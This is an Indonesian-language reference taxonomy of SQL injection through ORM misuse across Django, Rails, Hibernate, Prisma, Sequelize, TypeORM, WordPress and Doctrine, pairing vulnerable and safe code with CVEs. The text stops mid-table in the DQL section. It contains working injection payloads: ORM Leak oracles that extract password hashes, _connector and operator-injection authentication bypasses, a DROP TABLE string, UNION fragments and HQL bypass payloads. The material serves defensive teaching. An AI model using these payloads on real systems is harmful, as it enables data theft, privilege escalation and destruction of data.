---
title: "ORM Misuse SQL Injection"
description: ""
---

## Struktur Klasifikasi

Framework Object-Relational Mapping (ORM) — Django ORM, SQLAlchemy, ActiveRecord (Rails), Hibernate/JPA, Sequelize, TypeORM, Prisma, Entity Framework, Eloquent (Laravel), Doctrine (PHP), GORM (Go), dan lainnya — menjanjikan abstraksi SQL dan eliminasi injection. Dalam praktiknya, setiap ORM besar menyertakan fungsi, metode, atau permukaan API yang, ketika diberi input yang dikendalikan penyerang, runtuh kembali menjadi SQL injection yang dapat dieksploitasi. Kerentanan ini bukan "ORM yang rusak" melainkan "ORM mengekspos permukaan yang tidak aman yang diasumsikan aman oleh developer."

Taksonomi ini mengklasifikasikan ruang mutasi penuh SQL injection melalui ORM berdasarkan tiga sumbu ortogonal:

**Sumbu 1 — Permukaan Injeksi (APA titik masuknya):** API ORM, metode, atau fitur struktural spesifik yang melaluinya input yang dikendalikan penyerang memasuki pipeline query. Ini adalah sumbu utama dan menyusun isi dokumen ini.

**Sumbu 2 — Mekanisme Akar Penyebab (MENGAPA injeksi berhasil):** Cacat mendasar dalam cara input diproses — concatenation string, passthrough identifier yang tidak divalidasi, ekspansi dictionary tanpa sanitasi, koersi object-ke-query, atau perbedaan parser antara bahasa query ORM dan dialek SQL yang mendasarinya.

**Sumbu 3 — Hasil Eksploitasi (DI MANA digunakan sebagai senjata):** Serangan yang dihasilkan — bypass autentikasi, eksfiltrasi data karakter-per-karakter (ORM Leak), eskalasi hak akses, circumvention filter otorisasi, RCE via fungsi DBMS, atau denial of service.

| Akar Penyebab (Sumbu 2) | Deskripsi | Bagian Utama |
|---|---|---|
| **String Concatenation** | Input pengguna mentah yang digabungkan ke dalam string query tanpa parameterisasi | §1, §7 |
| **Unvalidated Identifier Passthrough** | Nama kolom, alias, atau nama tabel yang diterima tanpa validasi allowlist | §2 |
| **Dictionary/Object Expansion** | Dictionary yang dikontrol pengguna yang diperluas ke dalam metode query via `**kwargs` atau yang setara | §3, §4 |
| **Operator/Object Coercion** | Query operator yang disuntikkan sebagai object di mana nilai primitif yang diharapkan | §5 |
| **Insufficient Escaping** | ORM gagal melakukan escape pada karakter khusus dalam konteks tertentu (kunci JSON, komentar, wildcard) | §2, §6 |
| **Query Language Translation Gap** | Perbedaan antara bahasa query ORM (HQL/DQL/JPQL) dan SQL yang mendasarinya yang dieksploitasi | §7 |
| **Protocol-Level Boundary Corruption** | Batas pesan protokol wire database yang dirusak via parameter yang terlalu besar | §8 |

---

## §1. Fungsi Eksekusi Raw/Unsafe Query

Setiap ORM menyediakan "escape hatch" untuk mengeksekusi raw SQL. Fungsi-fungsi ini melewati semua parameterisasi di level ORM dan merupakan permukaan injeksi yang paling langsung. Kerentanannya lugas: developer menggunakan pemformatan string (f-string, concatenation, `.format()`) alih-alih placeholder yang diparameterisasi.

### §1-1. Eksekusi Raw SQL Eksplisit

Metode-metode ini menerima string SQL lengkap dan mengeksekusinya langsung terhadap database.

| Framework | Metode yang Rentan | Alternatif Aman |
|---|---|---|
| **Django** | `Model.objects.raw(sql)`, `cursor.execute(sql)` | `raw(sql, [params])`, `cursor.execute(sql, [params])` |
| **SQLAlchemy** | `session.execute(text(sql))`, `engine.execute(sql)` | `session.execute(text(sql), {"param": val})` |
| **ActiveRecord** | `ActiveRecord::Base.connection.execute(sql)`, `find_by_sql(sql)` | `find_by_sql([sql, params])` |
| **Hibernate/JPA** | `session.createNativeQuery(sql)`, `entityManager.createNativeQuery(sql)` | `.setParameter("name", value)` |
| **Sequelize** | `sequelize.query(sql)` | `sequelize.query(sql, { replacements: {} })` |
| **TypeORM** | `manager.query(sql)`, `queryRunner.query(sql)` | `manager.query(sql, [params])` |
| **Prisma** | `prisma.$queryRawUnsafe(sql)`, `prisma.$executeRawUnsafe(sql)` | `prisma.$queryRaw\`...\``, `Prisma.sql\`...\`` |
| **Entity Framework** | `context.Database.ExecuteSqlRaw(sql)`, `context.Set<T>().FromSqlRaw(sql)` | `ExecuteSqlInterpolated()`, `FromSqlInterpolated()` |
| **Eloquent** | `DB::statement(sql)`, `DB::select(sql)` | `DB::select(sql, [bindings])` |
| **Doctrine** | `$conn->executeQuery(sql)`, `$conn->exec(sql)` | `$conn->executeQuery(sql, [$param])` |
| **GORM** | `db.Raw(sql).Scan(&result)`, `db.Exec(sql)` | `db.Raw(sql, param).Scan(&result)` |

**Mekanisme:** Developer membangun SQL via interpolasi string:
```python
# Django — RENTAN
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")

# Django — AMAN
User.objects.raw("SELECT * FROM users WHERE name = %s", [name])
```

**Kondisi Utama:** Kerentanan ada setiap kali developer menggunakan pemformatan string alih-alih placeholder yang diparameterisasi. ORM itu sendiri berfungsi dengan benar — developer telah memilih untuk tidak menggunakan perlindungannya.

### §1-2. Injeksi Fragmen Query Semi-Raw

Banyak ORM menyediakan metode yang menerima fragmen SQL untuk klausa query tertentu, sambil tetap membangun query keseluruhan via metode ORM. Ini lebih berbahaya dari fungsi fully-raw karena developer menganggapnya sebagai "masih menggunakan ORM."

| Framework | Metode yang Rentan | Konteks Fragmen | Pola Aman |
|---|---|---|---|
| **Django** | `extra(where=[...])`, `extra(select={...})`, `RawSQL()` | WHERE, SELECT, ORDER BY | Deprecated — hindari sepenuhnya |
| **SQLAlchemy** | `text()` dalam `filter()`, `order_by(text(...))` | WHERE, ORDER BY | `text()` dengan bound params |
| **ActiveRecord** | `where("sql fragment")`, `order("sql")`, `select("sql")`, `group("sql")`, `having("sql")`, `joins("sql")`, `from("sql")`, `pluck("sql")` | Semua klausa | Sintaks hash/array: `where(name: val)` |
| **Eloquent** | `whereRaw()`, `orderByRaw()`, `selectRaw()`, `havingRaw()`, `groupByRaw()`, `DB::raw()` | WHERE, ORDER BY, SELECT, HAVING, GROUP BY | Teruskan bindings sebagai arg ke-2: `whereRaw('col = ?', [$val])` |
| **Hibernate/JPA** | `createQuery("HQL string")`, `createQuery("JPQL string")` | HQL/JPQL penuh | Binding `setParameter()` |
| **Doctrine** | `createQuery("DQL string")`, `$qb->where("DQL fragment")` | DQL penuh / WHERE | Binding `setParameter()` |
| **GORM** | `db.Where("sql fragment")`, `db.Order("sql")` | WHERE, ORDER BY | `db.Where("col = ?", val)` |
| **WordPress (wpdb)** | `$wpdb->prepare()` dengan format string bergaya `sprintf()` `%s`/`%d`; double-call ke `prepare()` memungkinkan format specifier dalam input pengguna bertahan dari pass pertama dan diinterpretasikan ulang | WHERE, LIKE, semua klausa | Hanya satu panggilan `prepare()`; `$wpdb->esc_like()` untuk nilai LIKE; validasi tidak ada format specifier yang dikontrol pengguna |

**Contoh — Laravel Eloquent:**
```php
// RENTAN — pengguna mengontrol arah sort dan kolom
$posts = Post::orderByRaw($request->input('sort'))->get();

// AMAN — gunakan bindings
$posts = Post::orderByRaw('created_at ?', [$direction])->get();

// PALING AMAN — allowlist
$allowed = ['created_at', 'title'];
$col = in_array($input, $allowed) ? $input : 'created_at';
```

**Contoh — ActiveRecord (Rails):**
```ruby
# RENTAN — sebelum Rails 6.1, ini diterima tanpa peringatan
User.order(params[:sort])
User.pluck(params[:column])

# Rails 6.1+ mengharuskan wrapper Arel.sql() untuk raw SQL
User.order(Arel.sql(params[:sort]))  # Masih rentan jika params tidak divalidasi!

# AMAN — allowlist
User.order(sort_column => sort_direction) if ALLOWED_COLUMNS.include?(sort_column)
```

**Contoh — WordPress (wpdb):**
```php
// RENTAN — double-call ke prepare() menciptakan injeksi format string
$wpdb->prepare(
    $wpdb->prepare("SELECT * FROM wp_posts WHERE title = %s", $user_input)
);
// Jika $user_input mengandung %s, ia bertahan dari inner prepare() dan diinterpretasikan
// sebagai format specifier dalam panggilan outer prepare()

// RENTAN — injeksi wildcard LIKE (% tidak di-escape)
$wpdb->prepare("SELECT * FROM wp_users WHERE name LIKE %s", '%admin%');
// Karakter % yang disuplai pengguna melewati sebagai wildcard SQL

// AMAN — panggilan prepare() tunggal dengan esc_like()
$like = '%' . $wpdb->esc_like($user_input) . '%';
$wpdb->prepare("SELECT * FROM wp_users WHERE name LIKE %s", $like);
```

**Injeksi Format Specifier `vsprintf` WordPress:**

Di luar kerentanan double-call, `prepare()` WordPress juga rentan terhadap **injeksi positional format specifier** (`%1$%s`). Karena `prepare()` secara internal menggunakan `vsprintf()`, penyerang yang mengontrol bagian mana pun dari string template SQL dapat menyuntikkan format specifier yang merujuk argumen lain berdasarkan posisi, mengekstrak atau memanipulasi data lintas batas query.

```php
// RENTAN — input pengguna mencapai template query (misalnya, via filter plugin)
$wpdb->prepare("SELECT * FROM wp_posts WHERE slug = %s AND category = '$user_input'", $safe_param);
// Jika $user_input = "%1$%s" → vsprintf menyelesaikannya ke nilai $safe_param
// membocorkan nilai argumen pertama ke dalam klausa category

// RENTAN — width specifier bergaya sprintf menyebabkan truncation query
// $user_input = "%1$c" (konversi char) atau "%1$'0999999s" (padding) dapat menghasilkan
// SQL yang terpotong/malformed yang mengubah semantik query
```

**Pola kunci:** Setiap code path di mana data yang dikontrol pengguna memasuki argumen pertama `$wpdb->prepare()` (template SQL) — baik secara langsung maupun melalui hook plugin, shortcode, atau meta query — menciptakan permukaan injeksi format string. Ini berbeda dari injeksi nilai yang diparameterisasi dan bertahan bahkan ketika semua placeholder `%s` digunakan dengan benar.

### §1-3. Injeksi Stored Procedure / Function Call

Beberapa ORM menyediakan antarmuka untuk memanggil stored procedure atau fungsi database. Ketika nama prosedur atau argumen dibangun dari input pengguna tanpa parameterisasi, injeksi terjadi pada batas panggilan.

| Framework | Pola Rentan | Contoh |
|---|---|---|
| **Entity Framework** | `context.Database.ExecuteSqlRaw($"EXEC {proc} {arg}")` | Injeksi nama prosedur/argumen |
| **Django** | `cursor.callproc(proc_name, [args])` dengan argumen yang dikaitkan | Injeksi argumen |
| **Hibernate** | `session.createStoredProcedureCall(name)` dengan nama dinamis | Injeksi nama prosedur |

---

## §2. Injeksi Column Alias dan Identifier

SQL identifier — nama kolom, nama tabel, alias — tidak dapat diparameterisasi di sebagian besar database. Ketika ORM menerima string yang dikontrol pengguna sebagai identifier dan memasukkannya ke dalam SQL yang dihasilkan tanpa validasi allowlist, penyerang mengontrol komponen struktural query.

### §2-1. Injeksi Column Alias via Aggregation/Annotation

Metode aggregation dan annotation ORM sering menerima kunci string sebagai column alias. Jika kunci-kunci ini dikontrol pengguna dan diperluas via dictionary unpacking, alias menjadi titik injeksi.

| Framework | Metode yang Rentan | CVE | Mekanisme |
|---|---|---|---|
| **Django** | `annotate(**kwargs)`, `alias(**kwargs)`, `aggregate(**kwargs)`, `extra(select=dict)` | CVE-2022-28346, CVE-2025-59681 | Kunci dict menjadi alias SQL; backend MySQL/MariaDB tidak melakukan quoting dengan benar |
| **ActiveRecord** | `annotate("sql fragment")` | CVE-2023-22794 | Injeksi komentar SQL dalam nilai annotation |
| **SQLAlchemy** | `query.with_entities(text(user_input))` | — | `text()` yang dikontrol pengguna sebagai pemilih entitas |

**Contoh Django CVE-2022-28346 / CVE-2025-59681:**
```python
# RENTAN — kunci dictionary yang dikontrol pengguna menjadi column alias
user_annotations = request.GET.dict()
queryset = MyModel.objects.annotate(**user_annotations)

# Kunci dict disuntikkan sebagai column alias dalam SQL yang dihasilkan:
# SELECT ... , (expression) AS "injected_alias_payload" FROM ...
```

Pada backend MySQL/MariaDB, quoting nilai alias yang tidak memadai memungkinkan breakout dari konteks alias ke dalam SQL arbitrer.

### §2-2. Injeksi Kunci JSONField

Ketika kunci field JSON berpartisipasi dalam konstruksi query sebagai identifier alih-alih nilai yang diparameterisasi, kunci JSON yang dibuat secara khusus menjadi fragmen SQL.

| Framework | Metode yang Rentan | CVE | Mekanisme |
|---|---|---|---|
| **Django** | `values(*args)`, `values_list(*args)` pada model dengan JSONField | CVE-2024-42005 | Kunci JSON yang diteruskan sebagai `*arg` menjadi column alias; lookup HasKey menghasilkan SQL yang tidak diparameterisasi |

**Contoh Django CVE-2024-42005:**
```python
# RENTAN — kunci JSON digunakan sebagai referensi kolom
key = request.GET.get('field')  # penyerang mengontrol ini
MyModel.objects.values(key)  # jika model memiliki JSONField, kunci menjadi fragmen SQL
```

Operator lookup `HasKey` yang digunakan secara internal untuk akses JSONField membangun SQL identifier dari path kunci JSON tanpa escaping yang memadai, memungkinkan injeksi via nilai kunci yang dibuat (CVSS 9.8).

### §2-3. Injeksi Nama Tabel/Kolom Dinamis

Ketika ORM mengizinkan pemilihan tabel atau kolom saat runtime dari input pengguna, identifier itu sendiri menjadi vektor injeksi karena parameterisasi SQL hanya mencakup nilai, bukan identifier.

| Framework | Pola Rentan | Contoh |
|---|---|---|
| **SQLAlchemy** | `Table(user_input, metadata, autoload=True)` | Injeksi nama tabel |
| **ActiveRecord** | `Model.from(user_input)` | Injeksi klausa FROM |
| **Entity Framework** | `context.Database.ExecuteSqlRaw($"SELECT * FROM {table}")` | Nama tabel via interpolasi |
| **GORM** | `db.Table(userInput).Find(&results)` | Injeksi nama tabel |

**Mitigasi:** Identifier memerlukan validasi allowlist yang ketat. Tidak ada pertahanan berbasis parameterisasi.

---

## §3. Injeksi Filter Parameter dan Lookup Operator (ORM Leak)

Kategori ini mewakili kelas serangan yang berbeda secara fundamental dari SQL injection tradisional. Alih-alih menyuntikkan sintaks SQL, penyerang mengeksploitasi API query ORM itu sendiri dengan mengontrol field, lookup operator, dan nilai apa yang digunakan dalam operasi filter. Hasilnya bukan eksekusi SQL arbitrer melainkan eksfiltrasi data sistematis melalui semantik query ORM yang dimaksudkan — teknik yang dikenal sebagai **ORM Leak**.

### §3-1. Injeksi Nama Field via Dictionary Expansion

Ketika aplikasi melakukan unpack dictionary yang dikontrol pengguna langsung ke dalam metode filter ORM, penyerang mengontrol field model mana yang di-query.

| Framework | Pola Rentan | Contoh |
|---|---|---|
| **Django** | `Model.objects.filter(**request.data)` | `{"password__startswith": "pbkdf2"}` |
| **Prisma** | `prisma.user.findMany({ where: req.body })` | `{"resetToken": {"startsWith": "abc"}}` |
| **Sequelize** | `Model.findAll({ where: req.body })` | `{"password": {"[Op.like]": "a%"}}` |
| **Ransack** | `q(params[:q])` | `q[user_password_start]=a` |

**Mekanisme:** Penyerang tidak menyuntikkan SQL. Sebaliknya, mereka memanipulasi parameter filter untuk melakukan query pada field sensitif (hash password, token API, token reset password) yang tidak pernah dimaksudkan oleh aplikasi untuk diekspos. Dikombinasikan dengan lookup operator (`__startswith`, `__contains`, `__regex`, `__gt`, `__lt`), penyerang membangun oracle karakter-per-karakter.

**Contoh Django:**
```python
# Kode aplikasi — RENTAN
articles = Article.objects.filter(**request.data)

# Penyerang mengirim:
# {"created_by__user__password__startswith": "pbkdf2_sha256$260000$"}
# Respons berisi artikel → prefix cocok → perpanjang dan ulangi
```

### §3-2. Relational Traversal via Lookup Chaining

ORM yang mendukung traversal relasi melalui sintaks query mereka memungkinkan penyerang menjangkau field pada model terkait yang tidak pernah dimaksudkan untuk di-query dari konteks saat ini.

| Framework | Sintaks Traversal | Contoh Serangan |
|---|---|---|
| **Django** | Double-underscore (`__`) | `created_by__user__password__startswith` |
| **Prisma** | Nested object dengan `some`/`every`/`none` | `{"createdBy": {"departments": {"some": {"employees": {"some": {"password": {"startsWith": "x"}}}}}}}` |
| **Ransack** | Path field yang dipisahkan underscore | `q[creator_recoveries_key_start]=0` |
| **Sequelize** | Eager-loading dengan `include` + nested `where` | `include: [{model: User, where: {password: {[Op.like]: 'a%'}}}]` |

**Rantai Eksploitasi:**

1. **One-to-One Traversal:** `created_by__user__password` — ikuti relasi ForeignKey untuk mengakses field model terkait
2. **Many-to-Many Traversal:** `categories__articles__created_by__user__password` — rantai melalui relasi M2M untuk menjangkau model yang tidak dimaksudkan
3. **Loopback Traversal:** Rantai relasi sirkular yang memperluas kumpulan record yang dapat diakses melampaui apa yang dimaksudkan oleh query asli
4. **Authorization Filter Bypass:** Join M2M menghasilkan INNER JOIN yang dapat mengakses record yang difilter oleh logika otorisasi aplikasi sendiri

**Contoh — Filter Bypass via M2M:**
```python
# Aplikasi membatasi pada artikel non-rahasia
articles = Article.objects.filter(is_secret=False, **request.data)

# Penyerang mengirim:
# {"categories__articles__id": 2, "categories__articles__is_secret": true}
# Join M2M memungkinkan query artikel rahasia via kategori yang dibagikan
```

### §3-3. Injeksi Pemilihan Lookup Operator

Ketika penyerang mengontrol bukan hanya nama field tetapi juga lookup operator, mereka dapat memilih oracle yang paling efektif untuk eksfiltrasi data.

| Operator | ORM | SQL yang Dihasilkan | Tipe Oracle |
|---|---|---|---|
| `__startswith` / `startsWith` | Django, Prisma | `LIKE 'prefix%'` | Boolean (keberadaan/ketiadaan respons) |
| `__contains` / `contains` | Django, Prisma | `LIKE '%substr%'` | Boolean / Time-based |
| `__regex` | Django | `REGEXP 'pattern'` | Error-based (ReDoS pada MySQL) |
| `__gt` / `__lt` | Django | `> value` / `< value` | Binary search berbasis perbandingan |
| `__in` | Django, Prisma | `IN (...)` | Enumerasi |
| `[Op.like]` / `[Op.regexp]` | Sequelize | `LIKE` / `REGEXP` | Boolean |
| `_start` / `_cont` | Ransack | `LIKE 'prefix%'` / `LIKE '%substr%'` | Boolean |

**Oracle Error-Based (Django + MySQL):**
```python
# Payload ReDoS memicu pengecualian mysql regexp_time_limit ketika prefix cocok
{"created_by__user__password__regex": "^(?=^pbkdf2).*.*.*.*.*.*.*.*!!!!$"}
# Jika password dimulai dengan "pbkdf2" → catastrophic backtracking regex → error
# Jika tidak → regex gagal cepat → respons normal
```

**Oracle Time-Based (Prisma + PostgreSQL):**
```json
{
  "OR": [
    {"NOT": {"createdBy": {"resetToken": {"startsWith": "target_prefix"}}}},
    {"body": {"contains": "random_string_1"}},
    {"body": {"contains": "random_string_2"}}
  ]
}
```
Ketika `startsWith` cocok, query executor PostgreSQL memproses kondisi CONTAINS tambahan, menciptakan perbedaan waktu yang terukur (divalidasi secara statistik via perbandingan berpasangan secara bersamaan, p = 1,58×10⁻⁵⁶).

### §3-4. Injeksi Karakter Wildcard dalam Operator LIKE

Ketika metode filter ORM menggunakan klausa SQL `LIKE` tanpa melakukan escape pada karakter wildcard level database (`%`, `_`), penyerang menyuntikkan wildcard untuk memperkuat perilaku query.

| Framework | Perilaku | Eksploitasi |
|---|---|---|
| **Prisma** | Tidak melakukan escape wildcard PostgreSQL dalam `contains` | Suntikkan urutan `%_` untuk meningkatkan waktu eksekusi query bagi oracle time-based |
| **Django** | Melakukan escape `%` dan `_` dalam nilai lookup | Umumnya aman, tetapi `__regex` mem-bypass perlindungan ini |
| **Sequelize** | Bergantung pada escaping spesifik dialect | Wildcard MySQL mungkin melewati |

---

## §4. Injeksi Parameter Konstruksi Query Internal

Di luar filter field dan operator, konstruksi query ORM mungkin mengekspos parameter struktural internal — logical connector, flag negasi, query hint — yang dirancang untuk penggunaan programatik tetapi menjadi injectable ketika dictionary pengguna diperluas tanpa penyaringan.

### §4-1. Injeksi Logical Connector (`_connector`)

| Framework | Parameter yang Rentan | CVE | Dampak |
|---|---|---|---|
| **Django** | `_connector` (AND/OR/XOR), `_negated` (boolean) | CVE-2025-64459 | SQL injection arbitrer via nilai connector; CVSS 9.1 |

**Mekanisme:** Object `Q()` Django dan metode QuerySet (`filter()`, `exclude()`, `get()`) menerima `_connector` sebagai keyword argument internal yang mengontrol cara kondisi query digabungkan. Sebelum dipatch, parameter ini tidak divalidasi ketika disuplai melalui dictionary expansion.

**Eksploitasi:**
```python
# Kode aplikasi — RENTAN
filters = request.GET.dict()
users = User.objects.filter(**filters)

# Serangan 1 — Bypass Autentikasi
# GET /users/?_connector=OR&is_superuser=True
# Mengubah AND menjadi OR, mencocokkan pengguna mana pun yang adalah superuser ATAU memenuhi kriteria lain

# Serangan 2 — Inversi Logika
# GET /users/?_negated=True&is_active=True
# Membalikkan filter untuk mengembalikan pengguna yang tidak aktif

# Serangan 3 — SQL Arbitrer via nilai _connector
# Nilai _connector dimasukkan ke dalam SQL yang dihasilkan tanpa sanitasi
# Nilai yang dibuat dapat keluar dari konteks SQL
```

**Patch:** Django 5.2.8/5.1.14/4.2.26 memperkenalkan validasi dua lapis:
1. Metode QuerySet memeriksa terhadap `frozenset` dari parameter yang dilarang, memunculkan `TypeError`
2. Object Q memvalidasi `_connector` terhadap nilai yang diizinkan (None, AND, OR, XOR), memunculkan `ValueError`

### §4-2. Injeksi Alias FilteredRelation

| Framework | Fitur yang Rentan | CVE | Mekanisme |
|---|---|---|---|
| **Django** | `FilteredRelation()` dengan `annotate()`/`alias()` | CVE-2025-57833 | Column alias dalam FilteredRelation tidak disanitasi dengan benar ketika diteruskan via `**kwargs` |

**Mekanisme:** Ketika `FilteredRelation` menghasilkan SQL untuk alias join, ia menerima nama alias dari kunci keyword argument dalam `annotate()` atau `alias()`. Nilai alias yang dibuat yang disuntikkan via dictionary expansion meloloskan diri dari konteks quoting.

---

## §5. Injeksi Operator/Object (Injeksi Bergaya NoSQL dalam SQL ORM)

Beberapa ORM JavaScript/TypeScript menerima query operator sebagai properti object. Ketika input pengguna di-parse dari badan request JSON tanpa validasi tipe, penyerang menyuntikkan object operator di mana nilai skalar yang diharapkan — pola yang secara historis dikaitkan dengan injeksi NoSQL tetapi sama efektifnya terhadap ORM penghasil SQL.

### §5-1. Injeksi Operator Berbasis String (Era Pre-Symbol)

| Framework | Versi yang Rentan | Sintaks Operator | CVE |
|---|---|---|---|
| **Sequelize** | < 4.12.0 | `$gt`, `$like`, `$ne`, `$regexp` | CVE-2019-10748 |

**Mekanisme:** Versi awal Sequelize menerima nama operator sebagai kunci string dalam object query:
```javascript
// Penyerang mengirim badan JSON:
{ "username": "admin", "password": { "$ne": "" } }

// Sequelize menghasilkan:
// WHERE username = 'admin' AND password != ''
// → Mengembalikan pengguna admin terlepas dari password
```

Fungsi `whereItemQuery()` memproses input pengguna mentah yang mengandung string operator tanpa validasi, memungkinkan manipulasi klausa WHERE arbitrer.

**Perbaikan:** Sequelize 4.12+ menggantikan operator string dengan operator berbasis Symbol (`Op.gt`, `Op.like`, `Op.ne`), mencegah injeksi berbasis string. Aplikasi harus menetapkan `operatorsAliases: false` untuk sepenuhnya menonaktifkan operator string warisan.

### §5-2. Injeksi Nested Object dalam Metode Repository

| Framework | Metode yang Rentan | CVE | Mekanisme |
|---|---|---|---|
| **TypeORM** | `repository.findOne(userInput)`, `repository.save()`, `repository.update()` | CVE-2022-33171, CVE-2025-60542 | Object JSON yang di-parse diteruskan langsung ke metode repository; nested object tidak di-stringify oleh driver MySQL |
| **Prisma** | `findFirst()`, `findMany()`, `updateMany()`, `deleteMany()` | — | Query operator (`startsWith`, `contains`, `gt`, `not`, `in`) diterima sebagai properti object |

**Contoh TypeORM CVE-2022-33171:**
```javascript
// RENTAN — JSON yang dikontrol pengguna menjadi kondisi query
const user = await userRepository.findOne(JSON.parse(req.body));

// Penyerang mengirim: {"where": {"isAdmin": true}}
// → SELECT * FROM user WHERE isAdmin = true
```

**Contoh TypeORM CVE-2025-60542:**
```javascript
// Default stringifyObjects: false driver mysql2 menyebabkan nested object
// diinterpolasikan sebagai fragmen SQL alih-alih nilai yang diparameterisasi
await repository.save(userControlledData);  // nested object menjadi SQL
```

### §5-3. Injeksi Operator Prisma

API type-safe Prisma menerima filter operator sebagai nested object, menciptakan permukaan injeksi operator ketika badan request diteruskan tanpa validasi skema.

```javascript
// RENTAN
const users = await prisma.user.findMany({
  where: req.body.filter  // penyerang mengontrol object filter
});

// Penyerang mengirim:
{
  "filter": {
    "email": { "contains": "@admin" },
    "password": { "startsWith": "hash_prefix" }
  }
}

// Prisma menghasilkan SQL yang valid dengan kondisi LIKE pada field password
```

**Mitigasi:** Cast semua input filter ke tipe primitif (`String()`, `Number()`) sebelum meneruskan ke Prisma. Gunakan validasi skema (Zod, Joi) untuk menolak struktur object yang tidak diharapkan.

---

## §6. Injeksi Klausa Ordering, Grouping, dan Aggregate

Klausa ORDER BY, GROUP BY, dan HAVING adalah target injeksi yang sering karena: (1) developer sering mengizinkan parameter sort yang dikontrol pengguna, (2) klausa-klausa ini menerima identifier yang tidak dapat diparameterisasi, dan (3) banyak ORM meneruskan string mentah ke SQL dalam konteks ini.

### §6-1. Injeksi ORDER BY

| Framework | Metode yang Rentan | Aman Sejak | Mitigasi |
|---|---|---|---|
| **ActiveRecord** | `order(user_input)`, `reorder(user_input)` | Rails 6.1 (mengharuskan `Arel.sql()`) | Allowlist nama kolom |
| **Django** | `order_by(user_input)` | Umumnya aman untuk nama field; rentan dengan `extra()` atau `RawSQL()` | Validasi terhadap field model |
| **SQLAlchemy** | `order_by(text(user_input))` | — | Gunakan object kolom, bukan text |
| **TypeORM** | `queryBuilder.orderBy(user_input)` | — | Allowlist kolom |
| **Eloquent** | `orderByRaw(user_input)` | — | Gunakan bindings: `orderByRaw('col ?', [$dir])` |
| **GORM** | `db.Order(user_input)` | — | Gunakan `db.Order("col ?", dir)` |
| **Hibernate** | `createQuery("... ORDER BY " + user_input)` | — | Gunakan Criteria API |

**Contoh ActiveRecord (Pre-Rails 6.1):**
```ruby
# RENTAN — SQL arbitrer dalam ORDER BY
User.order("name; DROP TABLE users; --")
User.order("(CASE WHEN (SELECT 1 FROM users WHERE admin='1' AND
  SUBSTRING(password,1,1)='a') THEN name ELSE email END)")

# Rails 6.1+ — mengharuskan opt-in eksplisit via Arel.sql()
User.order(Arel.sql(params[:sort]))  # Masih rentan tanpa allowlist!
```

### §6-2. Injeksi GROUP BY dan HAVING

| Framework | Metode yang Rentan | Contoh Payload |
|---|---|---|
| **ActiveRecord** | `group(user_input)` | `"name UNION SELECT * FROM users"` |
| **ActiveRecord** | `having(user_input)` | `"1) UNION SELECT * FROM orders--"` |
| **Eloquent** | `groupByRaw(user_input)`, `havingRaw(user_input)` | Fragmen SQL arbitrer |
| **SQLAlchemy** | `group_by(text(user_input))` | SQL arbitrer dalam konteks GROUP BY |

### §6-3. Injeksi Klausa SELECT / PLUCK

Ketika ORM menerima string yang dikontrol pengguna sebagai pemilih kolom, penyerang mengontrol klausa SELECT.

| Framework | Metode yang Rentan | Dampak |
|---|---|---|
| **ActiveRecord** | `select(user_input)`, `pluck(user_input)` (sebelum 6.1) | Kontrol klausa SELECT penuh: `"* FROM users WHERE admin='1';--"` |
| **ActiveRecord** | `calculate()`, `average()`, `count()`, `maximum()`, `minimum()`, `sum()` | Argumen kolom menerima raw SQL: `"age) FROM users WHERE name='Bob';"` |
| **Eloquent** | `selectRaw(user_input)` | Ekspresi arbitrer dalam SELECT |

---

## §7. Injeksi Bahasa Query ORM (HQL/DQL/JPQL)

Beberapa ORM mengimplementasikan bahasa query mereka sendiri yang dikompilasi ke SQL — HQL Hibernate, JPQL JPA, dan DQL Doctrine. Bahasa-bahasa ini bukan SQL tetapi berbagi cukup banyak sintaks sehingga injeksi dimungkinkan. Perbedaan utama: lapisan translasi dari ORM-QL ke SQL menciptakan teknik eksploitasi tambahan yang tidak tersedia dalam injeksi SQL langsung.

### §7-1. Injeksi HQL/JPQL (Hibernate/JPA)

HQL dan JPQL adalah bahasa query ORM yang paling banyak dieksploitasi. Meskipun mereka tidak memiliki fitur SQL seperti `UNION` dan komentar (`--`), translasi ke SQL memungkinkan eksploitasi lanjutan melalui fungsi spesifik DBMS.

**Konteks Injeksi:**
```java
// RENTAN — concatenation string dalam HQL
String hql = "FROM User u WHERE u.username = '" + username + "'";
Query query = session.createQuery(hql);

// AMAN — diparameterisasi
Query query = session.createQuery("FROM User u WHERE u.username = :name");
query.setParameter("name", username);
```

**Keterbatasan Injeksi HQL:**
- Tidak ada `UNION` (pengetikan ketat mencegah penggabungan tipe entitas yang berbeda)
- Tidak ada komentar SQL (`--`, `/* */` tidak didukung dalam parser HQL)
- Tidak ada akses tabel langsung (harus merujuk entitas yang dipetakan)
- Konteks `ORDER BY` / `GROUP BY` sangat dibatasi

**Teknik Bypass:**

| Teknik | DBMS Target | Mekanisme | Pola Payload |
|---|---|---|---|
| **Magic Function Abuse** | PostgreSQL | `query_to_xml()` mengevaluasi SQL arbitrer dalam parameter string | `array_upper(xpath('row',query_to_xml('SELECT version()',true,false,'')),1)` |
| **Magic Function Abuse** | Oracle | `DBMS_XMLGEN.getxml()` mengevaluasi SQL arbitrer | `NVL(TO_CHAR(DBMS_XMLGEN.getxml('SELECT banner FROM v$version')),'1')!='1'` |
| **Single Quote Escaping Differential** | MySQL | MySQL menggunakan escape `\`, HQL menggunakan tanda kutip ganda | `'abc\''or 1=(select 1)--'` |
| **Dollar-Quoted Strings** | PostgreSQL, H2 | Pembatas `$$` mem-bypass quoting HQL | `$$='$$=concat(chr(61),chr(39)) and 1=1--'` |
| **Unicode Delimiters** | MSSQL, H2 | Non-breaking space (`U+00A0`) di antara token mem-bypass parser | Pemisahan token via karakter tak terlihat |
| **Java Constants Resolution** | Semua (via Hibernate) | Hibernate menyelesaikan field `public static` dari classpath | `org.apache.batik.util.XMLConstants.XML_CHAR_APOS` menyediakan karakter kutipan |
| **Error-Based Extraction** | Semua | Paksa kesalahan type cast yang menyertakan data dalam pesan kesalahan | Hasil subquery yang di-cast ke tipe yang tidak kompatibel |

### §7-2. Injeksi DQL (Doctrine/PHP)

DQL (Doctrine Query Language) lebih dibatasi dari HQL tetapi tetap dapat dieksploitasi.

**Konteks Injeksi:**
```php
// RENTAN
$dql = "SELECT u FROM App\Entity\User u WHERE u.username = '" . $_GET['username'] . "'";
$query = $entityManager->createQuery($dql);

// AMAN
$query = $entityManager->createQuery(
    "SELECT u FROM App\Entity\User u WHERE u.username = :name"
);
$query->setParameter('name', $_GET['username']);
```

**Keterbatasan dan Eksploitasi Spesifik DQL:**

| Aspek | Perilaku |
|---|---|
| `UNION` | Tidak didukung — pengetikan entitas ketat |
| `INSERT` | Tidak didukung dalam DQL |
